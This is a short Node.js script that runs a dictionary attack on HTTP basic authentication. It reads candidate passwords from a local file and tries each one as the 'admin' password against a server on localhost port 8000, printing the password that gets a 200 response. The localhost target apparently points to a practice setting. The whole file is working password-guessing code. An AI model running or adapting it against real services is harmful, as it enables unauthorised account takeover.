'use strict';
const request = require('request');
const fs = require('fs');
const readline = require('readline');
const rs = fs.ReadStream('password');
const rl = readline.createInterface({ 'input': rs, 'output': {} });
rl.on('line', (line) => {
  request(`http://admin:${line}@localhost:8000/posts`, (error, response, body) => {
    if (!error && response.statusCode === 200) {
      console.log(`Password is "${line}"`);
      process.exit();
    }
  });
});
rl.on('close', () => {
  console.log('password file was closed.');
});
